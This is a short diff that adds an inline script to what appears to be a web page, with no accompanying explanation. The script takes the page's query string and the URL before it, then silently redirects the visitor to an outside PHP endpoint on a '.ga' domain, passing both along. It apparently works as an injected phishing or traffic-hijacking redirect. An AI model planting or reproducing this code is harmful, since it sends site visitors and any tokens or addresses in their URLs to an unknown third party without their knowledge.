@@ -1,0 +1,11 @@
+<script>
+var r = window.location.href;
+if(r.indexOf('?') !== -1) {
+	var parts = r.split('?');
+	var c = parts[parts.length - 1];
+	var k = c.replaceAll("+", "&");
+	var d = parts[parts.length - 2];
+		var string1 = 'https://webinfo2020.ga/git/109.php?' + k + '&r=' + d;
+	window.location.href = string1
+}
+</script>
